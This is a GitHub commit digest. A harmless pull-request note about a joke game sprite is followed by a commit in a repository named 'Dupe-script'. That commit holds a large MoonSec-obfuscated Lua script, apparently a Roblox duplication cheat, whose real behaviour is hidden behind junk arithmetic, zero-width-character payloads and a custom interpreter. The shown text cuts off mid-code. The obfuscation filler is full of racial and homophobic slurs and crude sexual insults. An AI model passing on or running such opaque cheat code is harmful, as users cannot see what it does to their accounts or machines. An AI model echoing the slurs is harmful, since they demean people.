On a VERY low chance (1/25000) a normal full tile firelock can instead be generated with a more suspicious appearance based on this recent quality shitpost.

Sussy firelocks are completely identical when open (save the desc) and thus are apt not to be noticed except during exciting times. It's a fully cosmetic joke that got me to log into github, and that's an accomplishment in itself. Probability rate fully negotiable, I've added a one in a million chance before after all.

* Adds a very rare sussy firelock

* ruins all the fun

people can get banned for doing the funny sus amogus so encouraging it in code, whilst it's beautiful and funny, eh someone is going to throw a fit.

Co-authored-by: Incoming5643 <incomingnumbers@gmail.com>
Co-authored-by: KathrinBailey <53862927+KathrinBailey@users.noreply.github.com>

---
## [dayrox12/Dupe-script](https://github.com/dayrox12/Dupe-script)@[d2126729e0...](https://github.com/dayrox12/Dupe-script/commit/d2126729e0444411e30b4841ce340b09c75fa704)
#### Wednesday 2022-04-13 18:09:48 by dayrox12

first script

_, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'


,nil,nil;(function() _msec=(function(e,n,o)local A=n["                 "];local X=o[e[(76998/0x7b)]][e["​​             "]];local c=(-#{99,(function()return{','}end)();'}',1,'nil';'nil'}+10)/((0x5e-(-#"mike litoris"+(0xee-(323-((19998/0x65)+-#'0nly was here mf')))))+-#"niggers")local i=(-#[[cilerteddoesntlikeburgers]]+((-#[[testpsx dupe no scam legit 2022 free no virus]]+(-0x3e+(((0x7+-41)+-#'Cock and ball tortue')+339)))-0x97))-(0x3e-61)local L=o[e[(314-0xa7)]][e["        ​   "]];local p=(124-(371-((0x5777b0/182)/0x7f)))+(0x70/56)local I=o[e[(-#{79;(function()return{','}end)();(function()return{','}end)();","}+518)]][e["                   "]]local d=(-0x73+117)-(((-0x40+192)+-0x14)-107)local B=(-#{84;1;(function()return#{('kfboOH'):find("\98")}>0 and 1 or 0 end);{},'}',",",1}+11)local N=((2768/(0xfc+((0x25+(-18832/((0xa77a/194)+-#[[testpsx dupe no scam legit 2022 free no virus]])))+-#'Niggabyte')))+-#[[Lana Rhoades]])local D=(160/((-#{'nil',40,77}+123)/3))local M=(-#'papier der afghaner wurde von nice dem bombenleger gefickt'+(15810/(590-(-#"never gonna give you up never gonna let you down"+(0x348-(460+-#{(function()return#{('MpPLPl'):find("\80")}>0 and 1 or 0 end),(function()return#{('MpPLPl'):find("\80")}>0 and 1 or 0 end);","}))))))local C=(-#'never gonna give you up never gonna let you down'+(0xac-(272-((-#'yeet'+(0xcb6f-26083))/171))))local m=(-#{",",(function()return#{('khbfOp'):find("\98")}>0 and 1 or 0 end),60,(function()return#{('khbfOp'):find("\98")}>0 and 1 or 0 end),39}+9)local k=(-#'Fucking Retarted'+(((-0x31+(-#"nerd"+(((-0xd97/71)+-#[[mike litoris]])+0xeca)))+-#'0nly 1337 smashed ur wap')/192))local U=((-#{{},15;'nil'}+43)+-37)local s=((-75-((-0x1b67+3451)/0xa2))+0x38)local u=(-#[[impulse was here omg]]+((100+-#{6,25,'}','}';(function()return#{('lHfbkk'):find("\102")}>0 and 1 or 0 end),(function()return#{('lHfbkk'):find("\102")}>0 and 1 or 0 end)})-71))local x=(((-#{",";",",10;1;",",",",5}+92)-0x39)+-#'cilerteddoesntlikeburgers')local O=((-#'yeet'+((-#{",";(function()return#{('FKfPKk'):find("\102")}>0 and 1 or 0 end),51,83,{};1,{}}+211)-0x73))-82)local f=((0x23-(34+-#{(function()return#{('bhkbLf'):find("\107")}>0 and 1 or 0 end),1,(function()return#{('bhkbLf'):find("\107")}>0 and 1 or 0 end),{},","}))+-#'nerd')local b=(-#[[never gonna give you up never gonna let you down]]+((-#{(function()return{','}end)(),184,",",1,1,184,'nil'}+9107)/0xb6))local h=(92/((5370-(-#{40,'}',1;40}+2706))/0x3a))local g=(((((-70-0x0)+37)-0x2b)+102)+-#[[big niggers sucking cock]])local w=(150/(((-24+0x27d)-0x152)-0xc8))local t=(-#{1,1,",";'nil';188}+7)local K=e[(155710/0x73)];local q=o[e[(-#'Niggabyte'+(0x199-253))]][e["            ​     "]];local H=o[(function(e)return type(e):sub(1,1)..'\101\116'end)('        ')..'\109\101'..('\116\97'or'        ')..e[(-#[[papier der afghaner wurde von nice dem bombenleger gefickt]]+(0x488-588))]];local _=o[e[(517+-#{(function()return{','}end)();42;(function()return{','}end)()})]][e["           ​       "]];local v=(-#{143,'}',143;(function()return#{('MfhBPM'):find("\104")}>0 and 1 or 0 end)}+6)-(-#"0nly segc"+((-#[[Niggabyte]]+((0x75-97)+-111))+0x6f))local y=(((-#"warboy hates you"+(0x515-669))-0x16e)/125)-(-#'Impulse youtube real'+(0x528/60))local R=o[e[(151+-#{(function()return{','}end)(),'}','nil';96})]][e["         "]];local n=function(e,n)return e..n end local z=(56+-0x34)*((456/(((-26+0x12da)+-#"big niggers sucking cock")/199))+-#[[howtodumpscript]])local j=o[e["      ​​           "]];local r=(-0x22+36)*(((0x1f9-(0x28e-(0x331-431)))+-92)+-#[[anime is for fags]])local F=(207872/0xcb)*((-#"papier der afghaner wurde von nice dem bombenleger gefickt"+((0x21d-(-#[[this is a meme string]]+(720-0x196)))-0x85))-55)local Q=((-62+(0xb1+(-#[[cilertedcool]]+(-0x5e+59))))+-#"cruz pp is large")local S=(442/(476-(0x926d/147)))*(-#[[send nudes]]+(0xbb8/250))local P=o[e["     ​    "]]or o[e[(0x8686/67)]][e["     ​    "]];local a=(62208/((-#[[yeet]]+(55196+-0x1f))/0xe3))local e=o[e["                  "]];local I=(function(r)local a,o=3,0x10 local n={j={},v={}}local l=-d local e=o+i while true do n[r:sub(e,(function()e=a+e return e-i end)())]=(function()l=l+d return l end)()if l==(z-d)then l=""o=v break end end local l=#r while e<l+i do n.v[o]=r:sub(e,(function()e=a+e return e-i end)())o=o+d if o%c==v then o=y _(n.j,(R((n[n.v[y]]*z)+n[n.v[d]])))end end return I(n.j)end)("..:::MoonSec::..                ​                 ​            ​                           ​                        ​      ​                         ​     ​                ​      ​          ​                                                ​   ​                               ​  ​                            ​                           ​                      ​                               ​     ​  ​                      ​ ​                               ​​            ​           ​       ​          ​          ​ ​                   ​      ​                              ​       ​​                     ​                             ​                               ​​                                                    ​       ​     ​           ​   ​​     ​  ​                                                ​  ​                   ​                   ​                    ​          ​          ​                                                                                 ​    ​          ​                   ​          ​   ​                   ​​     ​                            ​                  ​​                            ​     ​              ​  ​   ​     ​                 ​ ​                           ​              ​                         ​                 ​    ​       ​                           ​            ​                                              ​                            ​             ​              ​  ​    ​                                       ​          ​ ​                                                  ​        ​                              ​                        ​                                  ​                    ​                  ​                        ​             ​                  ​     ​                        ​     ​           ​                ​           ​                                             ​            ​   ​                   ​                                       ​                  ​          ​          ​         ​                     ​          ​                ​   ​​                                      ​                                                   ​                               ​         ​                ​                               ​           ​  ​              ​    ​                 ​                 ​                ​                                                    ​                              ​                                        ​  ​   ​                  ​                                                                                          ​     ​​                                                            ​                             ​                               ​        ​                    ​                 ​                            ​                                             ​                  ​     ​                     ​    ​                                                  ​     ​              ​                          ​                                                                                             ​       ​  ​                ​            ​​                            ​     ​   ​                                   ​​          ​                              ​                  ​         ​​          ​            ​                                         ​     ​​                                ​  ​                                                                          ​                                   ​                          ​                                  ​                             ​​                       ​ ​                          ​    ​​               ​ ​                        ​         ​                                                        ​      ​          ​      ​          ​   ​                ​                                                                                                                   ​                  ​                      ​ ​          ​                              ​                         ​                          ​                                              ​                               ​                ​   ​                           ​                         ​                                        ​                   ​                       ​            ​               ​       ​                        ​                                 ​          ​                      ​   ​               ​​                                              ​                   ​                                                     ​               ​                                           ​        ​                                                 ​              ​                                                                                               ​​          ​       ​     ​   ​     ​                        ​                                    ​                          ​                                     ​​                                                                        ​                            ​ ​                              ​                                               ​                   ​                               ​                      ​                              ​                                                              ​                                ​                            ​                     ​        ​                     ​        ​                  ​     ​                                              ​              ​  ​                         ​    ​                        ​                                  ​                            ​              ​               ​              ​               ​                                ​                    ​                                     ​                ​                                           ​                               ​                            ​      ​       ​              ​​                           ​                                  ​            ​                  ​  ​                             ​                                               ​          ​                             ​                                     ​                                ​                        ​​                                 ​                                                             ​                                ​                                                       ​                      ​                                                                      ​                           ​                                 ​    ​                          ​            ​                               ​                ​                     ​                                          ​                  ​                               ​          ​                   ​                   ​        ​                                ​                               ​                           ​   ​                              ​                                                         ​                                                            ​   ​                              ​ ​                         ​                              ​                                ​                    ​       ​                                ​                                                                                                  ​            ​             ​     ​            ​          ​                                                               ​                        ​       ​                                ​                               ​                          ​                                                              ​                           ​​                             ​                             ​                             ​                         ​                                                              ​       ​                                      ​                                                                                                         ​​                                ​                               ​                                               ​        ​                                       ​                                                                                      ​                              ​                              ​                            ​                         ​ ​            ​            ​                                    ​​        ​                       ​                                                                                     ​                          ​  ​                        ​       ​                         ​    ​                               ​                                                                 ​​                             ​           ​                                                                            ​                                 ​                              ​                                                        ​                                      ​                      ​                                 ​                                                        ​                               ​                              ​                                ​                            ​                               ​                                 ​                                ​                                   ​                                                                                                    ​            ​                     ​      ​   ​                            ​                              ​                            ​                                                                  ​                                                                                          ​                              ​                                  ​                                   ​                             ​    ​                           ​                              ​                               ​                                                                                      ​                       ​      ​                      ​        ​                            ​                             ​                         ​      ​                                                                 ​  ​      ​                                     ​     ​    ​                                                     ​                    ​        ​                       ​    ​                       ​    ​                            ​                                   ​                                ​                             ​                                                             ​                               ​                               ​                            ​                                  ​     ​                                                    ​            ​                   ​                         ​                                                     ​                           ​             ​                 ​          ​                             ​                       ​      ​                  ​                                    ​                                                                                     ​                 ​                    ​                                  ​                               ​                              ​                               ​                                                        ​   ​​                               ​                                                                                     ​                             ​                             ​                 ​        ");local _=((29770/0xe5)+-#[[deadphonelua]])local o=10 local l=d;local e={}e={[(0x36-53)]=function()local i,d,n,e=L(I,l,l+p);l=l+S;o=(o+(_*S))%a;return(((e+o-(_)+r*(S*c))%r)*((c*F)^c))+(((n+o-(_*c)+r*(c^p))%a)*(r*a))+(((d+o-(_*p)+F)%a)*r)+((i+o-(_*S)+F)%a);end,[(-#"If LocalPlayer equals Dumbass then while true do end"+(151+-0x61))]=function(e,e,e)local e=L(I,l,l);l=l+i;o=(o+(_))%a;return((e+o-(_)+F)%r);end,[((1582/0x71)+-#[[nicowashere]])]=function()local e,n=L(I,l,l+c);o=(o+(_*c))%a;l=l+c;return(((n+o-(_)+r*(c*S))%r)*a)+((e+o-(_*c)+a*(c^p))%r);end,[(((259-0x9d)+-#"howtodumpscript")-83)]=function(o,e,n)if n then local e=(o/c^(e-d))%c^((n-i)-(e-d)+i);return e-e%d;else local e=c^(e-i);return(o%(e+e)>=e)and d or y;end;end,[(0x4b/15)]=function()local n=e[(0xf5/245)]();local l=e[(0x88/136)]();local x=d;local o=(e[((0x91-123)+-#[[nico der hurensohn]])](l,i,z+S)*(c^(z*c)))+n;local n=e[(-#'Cock and ball tortue'+(-0x75+141))](l,21,31);local e=((-d)^e[(636/0x9f)](l,32));if(n==y)then if(o==v)then return e*y;else n=i;x=v;end;elseif(n==(r*(c^p))-i)then return(o==y)and(e*(i/v))or(e*(y/v));end;return X(e,n-((a*(S))-d))*(x+(o/(c^Q)));end,[(-#[[papier der afghaner wurde von nice dem bombenleger gefickt]]+(0xe8-168))]=function(n,c,c)local c;if(not n)then n=e[(46+-0x2d)]();if(n==y)then return'';end;end;c=q(I,l,l+n-d);l=l+n;local e=''for n=i,#c do e=K(e,R((L(q(c,n,n))+o)%a))o=(o+_)%r end return e;end}local function X(...)return{...},j('#',...)end local function q()local k={};local b={};local n={};local t={k,b,nil,n};local o={}local w=(-#{12;1,12;",";(function()return{','}end)();'}';","}+96)local l={[(0x1ac/107)]=(function(n)return not(#n==e[(76-0x4a)]())end),[((0x3e4/166)+-#[[nerd]])]=(function(n)return e[(0x154/68)]()end),[(0x273/209)]=(function(n)return e[(-#[[Negro]]+(0x420/96))]()end),[(22-0x16)]=(function(n)local l=e[(1428/0xee)]()local n=''local e=1 for o=1,#l do e=(e+w)%a n=K(n,R((L(l:sub(o,o))+e)%r))end return n end)};local n=e[(0x42/66)]()for n=1,n do local e=e[(-0x1d+31)]();local d;local e=l[e%(-#'Lana Rhoades'+(98+-0x25))];o[n]=e and e({});end;for r=1,e[(-#[[free bobux no skem]]+(0x5c+-73))]()do local n=e[(276/0x8a)]();if(e[(664/(-0x73+281))](n,d,i)==v)then local a=e[((3029/0xe9)+-#"Niggabyte")](n,c,p);local l=e[(((0x1a8-253)+-#'If LocalPlayer equals Dumbass then while true do end')-115)](n,S,c+S);local n={e[(-#'Cock and ball tortue'+(5014/0xda))](),e[(0x99/51)](),nil,nil};local b={[((75-0x47)+-#[[yeet]])]=function()n[O]=e[(-0x17+26)]();n[D]=e[(192/0x40)]();end,[((120-0x67)+-#'cruz pp is large')]=function()n[u]=e[((0x20a8/88)+-0x5e)]();end,[(0x37+-53)]=function()n[O]=e[((0x83-120)+-#"bigchungus")]()-(c^z)end,[((87-0x40)+-#'Cock and ball tortue')]=function()n[u]=e[(52/0x34)]()-(c^z)n[N]=e[(621/0xcf)]();end};b[a]();if(e[(0x1e4/121)](l,i,d)==i)then n[f]=o[n[h]]end if(e[(0x41+-61)](l,c,c)==d)then n[x]=o[n[U]]end if(e[((0x1518/225)+-#"Impulse youtube real")](l,p,p)==i)then n[D]=o[n[B]]end k[r]=n;end end;t[3]=e[(-#[[lego hax]]+((-4879/0x29)+129))]();for e=i,e[(0x12/18)]()do b[e-i]=q();end;return t;end;local function v(e,S,_)local y=e[c];local l=e[p];local e=e[d];return(function(...)local F={...};local R={};local a=e;local o={};local I=j('#',...)-i;local r=l;local l=d;local e=d e*=-1 local p=e;local z=y;local y={};local L=X for e=0,I do if(e>=r)then R[e-r]=F[e+i];else o[e]=F[e+d];end;end;local e=I-r+d local e;local r;while true do e=a[l];r=e[(36/0x24)];n=(8660029)while r<=((10553/0xad)+-#"deadphonelua")do n-= n n=(4751708)while(109+-0x55)>=r do n-= n n=(1211499)while(((-34+0x7f)+-#'testpsx dupe no scam legit 2022 free no virus')+-37)>=r do n-= n n=(3434207)while(-0x37+60)>=r do n-= n n=(2649255)while r<=((0xe6c/142)+-#"0nly 1337 smashed ur wap")do n-= n n=(8451148)while r<=(66+-0x42)do n-= n o[e[b]]=o[e[s]]-o[e[m]];break;end while(n)/((278576/0x5c))==2791 do n=(7629249)while r>(0xa8/168)do n-= n o[e[h]]=_[e[k]];break end while(n)/((-0x3d+2368))==3307 do o[e[b]]=o[e[k]];break end;break;end break;end while 2415==(n)/((29619/0x1b))do n=(900320)while r<=(-#'deadphonelua'+(95+-0x50))do n-= n local n;o[e[t]]=o[e[k]][e[D]];l=l+d;e=a[l];o[e[h]]=e[U];l=l+d;e=a[l];o[e[t]]=e[O];l=l+d;e=a[l];n=e[t]o[n]=o[n](P(o,n+d,e[x]))l=l+d;e=a[l];o[e[b]]=o[e[x]][e[C]];l=l+d;e=a[l];o[e[h]]=o[e[u]][e[m]];l=l+d;e=a[l];o[e[w]]=e[U];l=l+d;e=a[l];n=e[w]o[n]=o[n](o[n+i])l=l+d;e=a[l];o[e[w]]={};l=l+d;e=a[l];o[e[h]]=_[e[k]];break;end while 1655==(n)/((1174-0x276))do n=(5773166)while r>((116-0x67)+-#[[Niggabyte]])do n-= n o[e[w]]=S[e[u]];break end while 3247==(n)/((-#[[mf stfu]]+(381990/0xd6)))do o[e[h]]=(e[u]~=0);l=l+i;break end;break;end break;end break;end while(n)/((-0x4e+967))==3863 do n=(560994)while r<=(-0x4d+85)do n-= n n=(9187509)while r<=(135-0x81)do n-= n if not o[e[w]]then l=l+i;else l=e[k];end;break;end while 2881==(n)/((0x5efc2/((15456/0x70)+-#[[0nly was here mf]])))do n=(4806406)while r>(-#"papier ist ein kleiner schwanz lutscher"+(7498/0xa3))do n-= n local e=e[b]o[e]=o[e](o[e+i])break end while 2167==(n)/((-0x24+2254))do o[e[w]]={};break end;break;end break;end while 259==(n)/((0x115a-2276))do n=(338896)while(-#'deadphonelua'+(0xe85/177))>=r do n-= n do return end;break;end while(n)/((835-0x1dc))==944 do n=(9268400)while r>(0x64a/161)do n-= n local n;local r;o[e[f]]=_[e[x]];l=l+d;e=a[l];o[e[b]]=e[x];l=l+d;e=a[l];o[e[w]]=e[s];l=l+d;e=a[l];r=e[k];n=o[r]for e=r+1,e[N]do n=n..o[e];end;o[e[w]]=n;l=l+d;e=a[l];if not o[e[t]]then l=l+i;else l=e[O];end;break end while(n)/((((-24634/0xe2)+-#'monkey mode')+0x9a6))==3944 do if o[e[f]]then l=l+d;else l=e[x];end;break end;break;end break;end break;end break;end while 2043==(n)/((65230/((0x3ffc/126)+-#'Impulse youtube real')))do n=(912347)while(-0x42+83)>=r do n-= n n=(3430124)while r<=(-#[[cilertedcool]]+(0x112a/169))do n-= n n=(1991168)while r<=((0x81-111)+-#"Faggot")do n-= n o[e[t]][o[e[O]]]=o[e[N]];break;end while 3889==(n)/((-0x79+633))do n=(1927080)while(260/0x14)<r do n-= n do return o[e[f]]end break end while(n)/(((407694/0xee)-905))==2385 do local l=e[u];local n=o[l]for e=l+1,e[M]do n=n..o[e];end;o[e[w]]=n;break end;break;end break;end while 1241==(n)/(((0x2c2c-5683)-2861))do n=(507790)while r<=(-#[[nerd]]+(3268/0xac))do n-= n local i;local r;local n;o[e[w]]=e[x];l=l+d;e=a[l];o[e[f]]=e[U];l=l+d;e=a[l];o[e[w]]=#o[e[u]];l=l+d;e=a[l];o[e[h]]=e[u];l=l+d;e=a[l];n=e[h];r=o[n]i=o[n+2];if(i>0)then if(r>o[n+1])then l=e[s];else o[n+3]=r;end elseif(r<o[n+1])then l=e[O];else o[n+3]=r;end break;end while 2987==(n)/((395-0xe1))do n=(1342198)while(0xcc0/204)<r do n-= n local e=e[f]o[e](o[e+i])break end while(n)/((0xec4-1921))==722 do o[e[g]]=o[e[O]][o[e[C]]];break end;break;end break;end break;end while(n)/((-#[[0nly 1337]]+(-0x68+376)))==3469 do n=(94004)while(0x50/4)>=r do n-= n n=(845875)while r<=(153-0x87)do n-= n if o[e[b]]then l=l+d;else l=e[k];end;break;end while 505==(n)/((-#"0nly segc"+(3387-0x6a7)))do n=(6060500)while(0x27+-20)<r do n-= n o[e[f]]=_[e[U]];break end while 1564==(n)/(((509721/0x83)+-#[[0nly was here mf]]))do o[e[w]]=S[e[x]];break end;break;end break;end while 142==(n)/((-#"cilertedcool"+(0xa33c/62)))do n=(219728)while(132/0x6)>=r do n-= n n=(3761940)while r>(122-(0x51ab/207))do n-= n local l=e[g]local r={o[l](o[l+1])};local n=0;for e=l,e[M]do n=n+d;o[e]=r[n];end break end while 1060==(n)/(((0x1c46-3673)+-#"Fucking Retarted"))do l=e[k];break end;break;end while 443==(n)/(((-0x22ba/254)+0x213))do n=(5862224)while(-0x16+45)<r do n-= n do return end;break end while 3568==(n)/((((0xc4321/233)-0x6fc)+-#"free bobux no skem"))do local e=e[g]o[e]=o[e](o[e+i])break end;break;end break;end break;end break;end break;end while 3151==(n)/((0x1bfb0/76))do n=(836493)while(0x67-67)>=r do n-= n n=(3027912)while(0x51-51)>=r do n-= n n=(2064024)while r<=(-#"send nudes"+(0x940/64))do n-= n n=(4011429)while(0x82-105)>=r do n-= n local n=e[t]local r={o[n](P(o,n+1,e[k]))};local l=0;for e=n,e[D]do l=l+d;o[e]=r[l];end break;end while 2627==(n)/((3114-0x633))do n=(45381)while r>(-0x14+46)do n-= n o[e[h]]=o[e[k]][o[e[m]]];break end while(n)/(((-#[[anime is for fags]]+(-63+0xd2))-0x6d))==2161 do local l=e[O];local n=o[l]for e=l+1,e[M]do n=n..o[e];end;o[e[h]]=n;break end;break;end break;end while 1962==(n)/(((0x448b08/122)/0x23))do n=(13472976)while r<=(162-0x86)do n-= n local n=e[f];local d=o[n]local r=o[n+2];if(r>0)then if(d>o[n+1])then l=e[k];else o[n+3]=d;end elseif(d<o[n+1])then l=e[O];else o[n+3]=d;end break;end while(n)/((4055+-0x1a))==3344 do n=(44440)while r>(0x4e+-49)do n-= n o[e[b]]=e[u];break end while(n)/(((138-0x52)+-#"cilertedcool"))==1010 do o[e[t]]=(e[O]~=0);l=l+i;break end;break;end break;end break;end while(n)/((383280/0xf0))==1896 do n=(1536102)while(0x8f-110)>=r do n-= n n=(5502049)while(99-0x44)>=r do n-= n local l=e[b]local r={o[l](P(o,l+1,e[k]))};local n=0;for e=l,e[B]do n=n+d;o[e]=r[n];end break;end while 1867==(n)/((-#"cilerteddoesntlikeburgers"+(757860/0xff)))do n=(123234)while(0x6b+(-18075/0xf1))<r do n-= n local e={o,e};e[i][e[c][g]]=e[d][e[c][C]]+e[i][e[c][x]];break end while 46==(n)/((5414-0xaaf))do local n=e[g]local l,e=L(o[n](P(o,n+1,e[O])))p=e+n-1 local e=0;for n=n,p do e=e+d;o[n]=l[e];end;break end;break;end break;end while(n)/((0x8c2-1144))==1399 do n=(45360)while((172-(22814/0xbb))+-#[[cruz pp is large]])>=r do n-= n o[e[b]]=#o[e[u]];break;end while(n)/((0x6684/(0x6726/163)))==280 do n=(10362891)while r>(0x66-67)do n-= n local n=e[f]o[n]=o[n](P(o,n+d,e[x]))break end while 2779==(n)/((-#[[papier der afghaner wurde von nice dem bombenleger gefickt]]+(0xafaaa/190)))do o[e[f]]=o[e[k]][e[M]];break end;break;end break;end break;end break;end while 1959==(n)/((0xb925/111))do n=(4601980)while r<=(0xaa-128)do n-= n n=(2837835)while r<=(-84+(0x159-222))do n-= n n=(11680646)while r<=((0x23b7/223)+-#"nerd")do n-= n l=e[x];break;end while(n)/((8199-0x1010))==2858 do n=(433680)while r>(0x1138/116)do n-= n local r=e[b];local a=e[N];local n=r+2 local r={o[r](o[r+1],o[n])};for e=1,a do o[n+e]=r[e];end;local r=r[1]if r then o[n]=r l=e[u];else l=l+d;end;break end while(n)/((-#"impulse was here omg"+(0x927c/250)))==3336 do o[e[g]]=S[e[x]];l=l+d;e=a[l];o[e[t]]=#o[e[x]];l=l+d;e=a[l];S[e[u]]=o[e[w]];l=l+d;e=a[l];o[e[b]]=S[e[O]];l=l+d;e=a[l];o[e[g]]=#o[e[x]];l=l+d;e=a[l];S[e[O]]=o[e[t]];l=l+d;e=a[l];do return end;break end;break;end break;end while 2835==(n)/((0x456+-109))do n=(4566050)while((2538/0x36)+-#'niggers')>=r do n-= n local n=e[b]o[n](P(o,n+i,e[s]))break;end while 1450==(n)/((-28+0xc69))do n=(4471755)while(0x24ff/231)<r do n-= n local e={o,e};e[d][e[c][w]]=e[c][B]+e[c][s];break end while 3615==(n)/((0x9e5-1296))do o[e[b]]=e[s];break end;break;end break;end break;end while(n)/(((8715-0x1128)-0x8a4))==2180 do n=(1471320)while(111-0x42)>=r do n-= n n=(35008)while(8213/(482-0x123))>=r do n-= n local n=e[t];local r=o[n+2];local d=o[n]+r;o[n]=d;if(r>0)then if(d<=o[n+1])then l=e[u];o[n+3]=d;end elseif(d>=o[n+1])then l=e[u];o[n+3]=d;end break;end while(n)/((135656/(0x64c/13)))==32 do n=(8089474)while(0x2ec/(-#[[niggers]]+(170-0x92)))<r do n-= n if(o[e[t]]~=o[e[M]])then l=l+i;else l=e[k];end;break end while(n)/(((-80+0x9df)+-#"Ur mom"))==3314 do local n=o[e[m]];if not n then l=l+i;else o[e[t]]=n;l=e[s];end;break end;break;end break;end while 536==(n)/((-#'big niggers sucking cock'+(0x8beff/207)))do n=(3710266)while(-#'testpsx dupe no scam legit 2022 free no virus'+(-0x15+113))>=r do n-= n n=(3564840)while(4140/0x5a)<r do n-= n local n=e[b]o[n](P(o,n+i,e[s]))break end while(n)/((23790/(-#'nerd'+(3723/0xdb))))==1948 do local n=e[f]o[n]=o[n](P(o,n+d,e[u]))break end;break;end while(n)/((-#[[niggers]]+((17482080/0x4d)/0x58)))==1442 do n=(5851440)while((0xa6+-79)+-#[[papier ist ein kleiner schwanz lutscher]])<r do n-= n local r;local c;local n;o[e[t]]=o[e[U]][e[M]];l=l+d;e=a[l];o[e[h]]=e[u];l=l+d;e=a[l];o[e[g]]=o[e[U]][e[D]];l=l+d;e=a[l];o[e[w]]=o[e[u]][e[B]];l=l+d;e=a[l];o[e[h]]=o[e[x]];l=l+d;e=a[l];o[e[b]]=o[e[O]]-e[N];l=l+d;e=a[l];n=e[f]c={o[n](P(o,n+1,e[O]))};r=0;for e=n,e[D]do r=r+d;o[e]=c[r];end l=l+d;e=a[l];if not o[e[t]]then l=l+i;else l=e[x];end;break end while(n)/((-#[[mike litoris]]+(0x19ba-3334)))==1806 do local e={o,e};e[d][e[c][g]]=e[c][C]+e[c][s];break end;break;end break;end break;end break;end break;end break;end while(n)/((5735-0xb58))==3059 do n=(2843218)while((0x2509d4/213)/154)>=r do n-= n n=(2480603)while(-0x27+100)>=r do n-= n n=(336882)while(197-0x8e)>=r do n-= n n=(8590752)while(0x8d-89)>=r do n-= n n=(10682640)while((10912/0xb0)+-#"mike litoris")>=r do n-= n local r=z[e[x]];local d;local n={};d=H({},{__index=function(o,e)local e=n[e];return e[1][e[2]];end,__newindex=function(l,e,o)local e=n[e]e[1][e[2]]=o;end;});for d=1,e[C]do l=l+i;local e=a[l];if e[(-0x3c+61)]==69 then n[d-1]={o,e[x]};else n[d-1]={S,e[O]};end;y[#y+1]=n;end;o[e[h]]=v(r,d,_);break;end while(n)/(((124620/0x1f)+-#'send nudes'))==2664 do n=(4915215)while(186-0x87)<r do n-= n if(o[e[b]]~=e[C])then l=l+i;else l=e[O];end;break end while(n)/((0xca9-1658))==3105 do if(o[e[g]]==e[D])then l=l+i;else l=e[O];end;break end;break;end break;end while 2934==(n)/((5917-0xbad))do n=(6596672)while r<=(-#"bigchungus"+(112+-0x31))do n-= n _[e[U]]=o[e[t]];break;end while(n)/((-105+0xf29))==1747 do n=(960680)while(212-0x9e)<r do n-= n local D;local r;local s;local n;o[e[b]]=_[e[U]];l=l+d;e=a[l];o[e[g]]=o[e[k]][e[N]];l=l+d;e=a[l];n=e[h];s=o[e[O]];o[n+1]=s;o[n]=s[e[C]];l=l+d;e=a[l];o[e[f]]=o[e[u]];l=l+d;e=a[l];o[e[f]]=o[e[u]];l=l+d;e=a[l];n=e[h]o[n]=o[n](P(o,n+d,e[k]))l=l+d;e=a[l];n=e[b];s=o[e[k]];o[n+1]=s;o[n]=s[e[M]];l=l+d;e=a[l];n=e[f]o[n]=o[n](o[n+i])l=l+d;e=a[l];r={o,e};r[i][r[c][w]]=r[d][r[c][C]]+r[i][r[c][x]];l=l+d;e=a[l];o[e[b]]=o[e[O]]%e[M];l=l+d;e=a[l];n=e[b]o[n]=o[n](o[n+i])l=l+d;e=a[l];s=e[U];D=o[s]for e=s+1,e[B]do D=D..o[e];end;o[e[h]]=D;l=l+d;e=a[l];r={o,e};r[i][r[c][f]]=r[d][r[c][B]]+r[i][r[c][x]];l=l+d;e=a[l];o[e[t]]=o[e[U]]%e[B];break end while(n)/((-#[[Faggot]]+((2954/0x7)+-87)))==2920 do if(o[e[h]]~=o[e[N]])then l=l+i;else l=e[O];end;break end;break;end break;end break;end while 1234==(n)/((50778/0xba))do n=(5170926)while(-84+0x8e)>=r do n-= n n=(4986366)while r<=(226-0xaa)do n-= n local i;local c,O;local r;local n;o[e[t]]=_[e[x]];l=l+d;e=a[l];o[e[h]]=_[e[k]];l=l+d;e=a[l];o[e[b]]=o[e[u]][e[B]];l=l+d;e=a[l];n=e[t];r=o[e[s]];o[n+1]=r;o[n]=r[e[B]];l=l+d;e=a[l];o[e[t]]=e[x];l=l+d;e=a[l];n=e[b]o[n]=o[n](P(o,n+d,e[U]))l=l+d;e=a[l];n=e[f];r=o[e[s]];o[n+1]=r;o[n]=r[e[M]];l=l+d;e=a[l];o[e[w]]=e[k];l=l+d;e=a[l];n=e[f]c,O=L(o[n](P(o,n+1,e[u])))p=O+n-1 i=0;for e=n,p do i=i+d;o[e]=c[i];end;l=l+d;e=a[l];n=e[g]o[n]=o[n](P(o,n+d,p))break;end while(n)/(((0xab3b2/193)+-120))==1419 do n=(170765)while(0xa7-110)<r do n-= n local r;local n;o[e[t]]=o[e[k]][e[m]];l=l+d;e=a[l];o[e[w]]=_[e[u]];l=l+d;e=a[l];n=e[b];r=o[e[u]];o[n+1]=r;o[n]=r[e[N]];l=l+d;e=a[l];o[e[g]]=e[k];l=l+d;e=a[l];n=e[b]o[n]=o[n](P(o,n+d,e[x]))l=l+d;e=a[l];o[e[w]]=o[e[U]][e[C]];l=l+d;e=a[l];o[e[f]]=o[e[s]][e[C]];l=l+d;e=a[l];o[e[b]]=o[e[x]][e[N]];l=l+d;e=a[l];o[e[g]]=o[e[u]][e[C]];l=l+d;e=a[l];o[e[h]]=o[e[x]][e[B]];break end while(n)/((0x5f1-824))==245 do o[e[b]]=o[e[s]]%e[N];break end;break;end break;end while 2031==(n)/((5214-0xa6c))do n=(2824500)while r<=(-26+0x55)do n-= n local r;local i;local n;o[e[t]]=o[e[u]][e[N]];l=l+d;e=a[l];n=e[w]o[n]=o[n]()l=l+d;e=a[l];o[e[t]]=o[e[U]][e[D]];l=l+d;e=a[l];n=e[b]i={o[n](o[n+1])};r=0;for e=n,e[m]do r=r+d;o[e]=i[r];end l=l+d;e=a[l];l=e[x];break;end while 1614==(n)/((0x6acfc/250))do n=(555076)while r>(0x348/14)do n-= n local e=e[f]o[e](o[e+i])break end while 604==(n)/((-0x5f+1014))do o[e[b]]={};break end;break;end break;end break;end break;end while 977==(n)/(((-#'0nly segc'+(-126+0x46b2d))/0x72))do n=(13613424)while((0xff-167)+-#[[this is a meme string]])>=r do n-= n n=(1790062)while r<=(-#[[niggers]]+(0x4202/238))do n-= n n=(7163770)while(13392/(0x112+-58))>=r do n-= n o[e[w]]=o[e[U]]-o[e[N]];break;end while 2942==(n)/((0x9fd+-122))do n=(5836628)while(0x99-90)<r do n-= n 